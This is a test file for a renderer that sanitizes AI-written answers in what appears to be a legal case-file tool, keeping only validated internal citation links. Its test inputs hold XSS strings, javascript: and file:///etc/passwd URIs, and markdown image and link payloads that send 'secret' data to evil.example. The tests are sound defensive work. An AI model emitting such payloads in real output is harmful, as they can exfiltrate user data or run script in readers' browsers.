// SPDX-License-Identifier: Apache-2.0
// The answer renderer: nothing that loads, links or runs survives; only validated /doc links do.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  citationIndex, DROPPED_NOTE, docHref, hrefsOf, isBackgroundHeading, LINK_REMOVED, nameLabel, PENDING_NOTE, renderAnswer, stripUnsafe,
  type Block, type Inline,
} from './sanitize.ts';

const CITES = [{ id: 'doc-a', page: 3, name: 'Alpha.pdf' }];

/** Everything a rendering would put on screen, as one string. */
function visible(blocks: readonly Block[]): string {
  const text = (t: Inline) => (t.kind === 'cite' ? `${t.label}<${t.href}>` : t.text);
  return blocks
    .flatMap((b) => (b.kind === 'h' ? [b.text] : (b.kind === 'p' ? b.inline : b.items.flat()).map(text)))
    .join(' ');
}

test('HTML is removed, not escaped into view', () => {
  const out = visible(renderAnswer('Hi <script>alert(1)</script><img src=x onerror=alert(1)><b>bold</b> <!-- c --> <iframe src="/x">', CITES));
  assert.equal(/[<>]/.test(out.replace(/<\/doc[^>]*>/g, '')), false, out);
  for (const bad of ['script', 'onerror', 'iframe', 'img']) assert.equal(out.includes(bad), false, bad);
  assert.match(out, /Hi alert\(1\)bold/);
});

test('images vanish entirely, alt text and target included', () => {
  for (const src of ['![x](https://evil.example/?q=secret)', '![](data:image/png;base64,AAAA)', '![x][1]\n\n[1]: https://evil.example/p.png']) {
    const out = visible(renderAnswer(`before ${src} after`, CITES));
    assert.equal(/evil|data:|!\[|base64/.test(out), false, `${src} -> ${out}`);
  }
});

test('links keep their words but lose their targets; no scheme survives', () => {
  const answer = [
    '[click me](https://evil.example/steal?q=1)',
    '[run](javascript:alert(1)) [page](data:text/html,<b>x</b>) [mail](mailto:a@b.example)',
    'Bare https://evil.example/x and www.evil.example and <https://evil.example/auto>',
    'Also JavaScript:alert(1) and vbscript:msgbox and file:///etc/passwd',
  ].join('\n\n');
  const blocks = renderAnswer(answer, CITES);
  assert.deepEqual(hrefsOf(blocks), []);
  const out = visible(blocks);
  assert.match(out, /click me/);
  assert.match(out, /run page mail/, 'nested parentheses in a target leave no stray characters');
  assert.equal(/https?:|javascript:|data:|vbscript:|file:|mailto:|www\.|evil/i.test(out), false, out);
  assert.ok(out.includes(LINK_REMOVED));
});

test('a validated citation becomes the one internal link shape', () => {
  const blocks = renderAnswer('READ: It happened [doc:doc-a p:3].', CITES);
  assert.deepEqual(hrefsOf(blocks), ['/doc/?id=doc-a#page=3']);
  assert.match(visible(blocks), /Alpha\.pdf, p\. 3/);
});

test('a fullwidth citation from gpt-oss renders exactly like the ASCII one', () => {
  const blocks = renderAnswer('READ: It happened 【doc:doc-a p:3】.', CITES);
  assert.deepEqual(hrefsOf(blocks), ['/doc/?id=doc-a#page=3']);
  assert.match(visible(blocks), /Alpha\.pdf, p\. 3/);
  assert.doesNotMatch(visible(blocks), /【|】/);
});

test('citations not in the validated set are notes, never links', () => {
  const blocks = renderAnswer('A [doc:doc-a p:4] B [doc:doc-zzz p:1] C [doc:doc-a p:3]', CITES);
  assert.deepEqual(hrefsOf(blocks), ['/doc/?id=doc-a#page=3']);
  assert.equal(visible(blocks).split(DROPPED_NOTE).length - 1, 2);
});

test('while streaming (no citations yet) every citation is pending', () => {
  const blocks = renderAnswer('A [doc:doc-a p:3]', null);
  assert.deepEqual(hrefsOf(blocks), []);
  assert.ok(visible(blocks).includes(PENDING_NOTE));
});

test('hostile citation entries from the wire are refused', () => {
  const wire = [
    { id: 'javascript:alert(1)', page: 1, name: 'x' },
    { id: 'doc-b', page: 1.5, name: 'x' },
    { id: 'doc-c', page: 0, name: 'x' },
    { id: 'doc-d', page: 1 },
    'nonsense',
    null,
  ];
  const blocks = renderAnswer('[doc:doc-b p:1] [doc:doc-c p:0] [doc:doc-d p:1]', wire);
  assert.deepEqual(hrefsOf(blocks), []);
  assert.equal(docHref('a/b', 1), null);
  assert.equal(docHref('doc-a', 100_001), null);
  assert.equal(docHref('doc-a', 2), '/doc/?id=doc-a#page=2');
});

test('a citation written as a markdown link stays a citation, not an external link', () => {
  const blocks = renderAnswer('[doc:doc-a p:3](https://evil.example)', CITES);
  assert.deepEqual(hrefsOf(blocks), ['/doc/?id=doc-a#page=3']);
});

test('structure: paragraphs, bullets, the background heading, bold', () => {
  const answer = [
    'Summary line one.',
    'line two.',
    '',
    '- CONFIRMED: first [doc:doc-a p:3]',
    '* READ: second',
    '',
    '**General background (not from the case files)**',
    'Courts generally **read** documents as a whole.',
    'General information, read by AI. Have your own lawyer review before relying on it.',
  ].join('\n');
  const blocks = renderAnswer(answer, CITES);
  assert.deepEqual(blocks.map((b) => b.kind), ['p', 'ul', 'h', 'p']);
  assert.equal((blocks[1] as Extract<Block, { kind: 'ul' }>).items.length, 2);
  assert.equal((blocks[2] as Extract<Block, { kind: 'h' }>).text, 'General background (not from the case files)');
  const last = blocks[3] as Extract<Block, { kind: 'p' }>;
  assert.ok(last.inline.some((t) => t.kind === 'strong' && t.text === 'read'));
});

test('a tag that only forms once an inner one is removed goes too', () => {
  assert.equal(stripUnsafe('<<b>script>alert(1)<</b>/script>'), 'alert(1)');
});

test('ordinary prose with angle brackets and colons is left alone', () => {
  assert.equal(stripUnsafe('If x < 5 and y > 3. Data: two items. Note: tel 555.'), 'If x < 5 and y > 3. Data: two items. Note: tel 555.');
});

test('a numbered citation reads as the room cite form, with the quote carried for the pane', () => {
  const wire = [{ id: 'doc-a', page: 3, name: 'Alpha.pdf', control_seq: 412, quote: 'Roe confirmed the order at 9:41 am.' }];
  const label = (c: { control_seq?: number | null; page: number }) => (c.control_seq ? `DOE-${String(c.control_seq).padStart(6, '0')} at ${c.page}` : '');
  const blocks = renderAnswer('CONFIRMED: Approved [doc:doc-a p:3].', wire, label);
  assert.match(visible(blocks), /DOE-000412 at 3<\/doc\/\?id=doc-a#page=3>/);
  const cite = (blocks[0] as Extract<Block, { kind: 'p' }>).inline.find((t) => t.kind === 'cite');
  assert.deepEqual(cite, {
    kind: 'cite',
    href: '/doc/?id=doc-a#page=3',
    label: 'DOE-000412 at 3',
    id: 'doc-a',
    page: 3,
    name: 'Alpha.pdf',
    quote: 'Roe confirmed the order at 9:41 am.',
  });
  assert.equal(nameLabel({ id: 'doc-a', page: 2, name: 'Alpha.pdf' }), 'Alpha.pdf, p. 2');
  const unnumbered = renderAnswer('READ: x [doc:doc-a p:3].', [{ id: 'doc-a', page: 3, name: 'Alpha.pdf' }], label);
  assert.match(visible(unnumbered), /Alpha\.pdf, p\. 3/, 'an empty label falls back to the name');
});

test('hostile control numbers and quotes from the wire are neutralized', () => {
  const index = citationIndex([
    { id: 'a', page: 1, name: 'A', control_seq: -4, quote: 42 },
    { id: 'b', page: 1, name: 'B', control_seq: 1.5, quote: `x\u0000<script>${'y'.repeat(400)}` },
    { id: 'c', page: 1, name: 'C', control_seq: '12', quote: '   ' },
  ])!;
  assert.deepEqual([...index.values()].map((c) => c.control_seq), [null, null, null]);
  assert.equal(index.get('a:1')!.quote, null);
  assert.equal(index.get('c:1')!.quote, null);
  const quote = index.get('b:1')!.quote!;
  assert.equal(quote.length, 200);
  assert.doesNotMatch(quote, /\u0000/);
});

test('the background heading is recognized however the model dresses it', () => {
  assert.ok(isBackgroundHeading(' General background (not from the case files) '));
  assert.equal(isBackgroundHeading('General background'), false);
});
